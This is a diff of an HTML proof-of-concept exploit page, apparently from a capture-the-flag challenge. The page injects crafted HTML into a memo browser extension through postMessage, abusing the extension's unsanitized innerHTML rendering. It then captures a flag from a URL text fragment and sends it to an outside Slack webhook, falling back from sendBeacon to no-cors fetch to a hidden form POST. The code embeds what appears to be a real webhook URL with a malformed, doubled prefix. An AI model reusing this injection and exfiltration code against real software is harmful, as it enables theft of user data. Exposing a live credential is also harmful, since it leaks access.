@@ -1,64 +1,119 @@
 <!DOCTYPE html>
-<meta charset="utf-8">
+<meta charset="utf-8" />
 <title>MemoPad Leak PoC</title>
-<body style="font-family: system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial;">
+<body style="font-family: system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial; line-height:1.4">
   <h1>MemoPad Leak PoC</h1>
   <p>Status: <span id="status">booting…</span></p>
-  <p>If the exploit works, this page will be revisited with a text fragment containing the flag.
-     Check the <b>Console</b> for logs (Cmd/Ctrl+Option/Alt+I → Console).</p>
+  <p>This page plants a malicious memo, then waits to be revisited with a text fragment. When it returns, it will send the flag to your Slack webhook.</p>
   <hr>
   <details open>
     <summary>Payload being sent</summary>
-    <pre id="payloadBox"></pre>
+    <pre id="payloadBox" style="white-space:pre-wrap"></pre>
   </details>
   <hr>
-  <h2>Captured</h2>
+  <h2>Captured (preview)</h2>
   <pre id="captured">(nothing yet)</pre>
 </body>
-<script>
-(function(){
-  const status = document.getElementById('status');
-  const captured = document.getElementById('captured');
-  const payloadBox = document.getElementById('payloadBox');
 
-  // 1) Save a malicious memo into the extension via window.postMessage
-  // This injects a fake .memo-item that points to index=0 (the flag memo the bot saved first)
-  // and supplies our own .memo-url link. The <template> keeps our link as the last one.
-  const attackerUrl = location.origin + location.pathname; // current page URL
-  const payload = '</div></div>' +
-                  '<div class="memo-item" data-index="0">' +
-                  '<a class="memo-url" href="' + attackerUrl + '">open</a>' +
-                  '</div>' +
-                  '<template>';
+<script>
+/*** 1) CONFIG — REPLACE ONLY THIS VALUE ***/
+const SLACK_WEBHOOK = "https://hooks.slack.com/services/https://hooks.slack.com/services/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";
+/*** END CONFIG ***/
+
+(function () {
+  const statusEl = document.getElementById("status");
+  const capturedEl = document.getElementById("captured");
+  const payloadBox = document.getElementById("payloadBox");
+
+  // --- Plant the malicious memo into the extension (unsanitized innerHTML in popup) ---
+  // We inject a fake .memo-item with data-index="0" (the flag memo saved by the bot),
+  // and our own .memo-url link that points back to THIS page.
+  // An unclosed <template> swallows everything after, making our link the last .memo-url.
+  const attackerUrl = location.origin + location.pathname; // exact URL of this page
+  const payload =
+    "</div></div>" +
+    '<div class="memo-item" data-index="0">' +
+    '<a class="memo-url" href="' + attackerUrl + '">open</a>' +
+    "</div>" +
+    "<template>";
 
   payloadBox.textContent = payload;
-  status.textContent = 'posting payload…';
+  statusEl.textContent = "posting payload…";
   try {
-    window.postMessage({ type: 'create', payload }, '*');
-    console.log('[PoC] Malicious memo posted');
-    status.textContent = 'payload posted; waiting for bot to open the popup and click our link…';
+    window.postMessage({ type: "create", payload }, "*");
+    console.log("[PoC] Malicious memo posted");
+    statusEl.textContent = "payload posted; waiting for bot to open popup and click our link…";
   } catch (e) {
-    console.error('postMessage error:', e);
-    status.textContent = 'postMessage failed: ' + e;
+    console.error("postMessage error:", e);
+    statusEl.textContent = "postMessage failed: " + e;
   }
 
-  // 2) When the popup click brings us back with #:~:text=<FLAG>, read and show it
-  function checkFragment(){
+  // --- When we are revisited with #:~:text=<FLAG>, capture and send to Slack ---
+  function tryExtractFlag() {
     const m = location.href.match(/#:~:text=(.*)$/);
     if (!m) return false;
-    const flag = decodeURIComponent(m[1] || '');
-    console.log('[PoC] Captured text fragment =', flag);
-    captured.textContent = flag ? flag : '(empty)';
-    status.textContent = 'Got it!';
-    // Optional: Send to a collector (uncomment and set your endpoint)
-    // fetch('https://your-collector.example.com/capture?flag=' + encodeURIComponent(flag))
-    //   .catch(()=>{});
+    const flag = decodeURIComponent(m[1] || "");
+    capturedEl.textContent = flag || "(empty)";
+    statusEl.textContent = "flag captured; sending to Slack…";
+    console.log("[PoC] Captured text fragment =", flag);
+
+    // Prepare Slack message
+    const text = `:triangular_flag_on_post: *CTF Flag*\n\`${flag}\`\nfrom <${location.href}|attacker.html>`;
+    const body = JSON.stringify({ text });
+
+    // Attempt 1: sendBeacon (avoids CORS preflight; fire-and-forget)
+    let sent = false;
+    try {
+      if (navigator.sendBeacon) {
+        const blob = new Blob([body], { type: "text/plain;charset=UTF-8" });
+        sent = navigator.sendBeacon(SLACK_WEBHOOK, blob);
+      }
+    } catch (e) {
+      console.warn("sendBeacon failed:", e);
+    }
+
+    // Attempt 2: fetch without custom headers (avoids preflight); Slack usually accepts JSON regardless of content-type
+    if (!sent) {
+      try {
+        fetch(SLACK_WEBHOOK, {
+          method: "POST",
+          mode: "no-cors",
+          // no headers → simple request; body still contains JSON string
+          body
+        }).catch(() => {});
+        sent = true; // we won't know result in no-cors, but request is dispatched
+      } catch (e) {
+        console.warn("fetch(no-cors) failed:", e);
+      }
+    }
+
+    // Attempt 3: form POST fallback
+    if (!sent) {
+      try {
+        const form = document.createElement("form");
+        form.action = SLACK_WEBHOOK;
+        form.method = "POST";
+        form.style.display = "none";
+        const input = document.createElement("textarea");
+        // Some endpoints accept urlencoded/plain; we just send the JSON string in a field
+        input.name = "payload";
+        input.value = body;
+        form.appendChild(input);
+        document.body.appendChild(form);
+        form.submit();
+        sent = true;
+      } catch (e) {
+        console.warn("form submit failed:", e);
+      }
+    }
+
+    statusEl.textContent = "sent to Slack (check your channel)";
     return true;
   }
 
-  // Check immediately (if you refreshed) and again after a short delay
-  if (!checkFragment()) {
-    setTimeout(checkFragment, 800);
+  // Try immediately (for manual testing) and again after a short delay
+  if (!tryExtractFlag()) {
+    setTimeout(tryExtractFlag, 700);
   }
 })();
 </script>
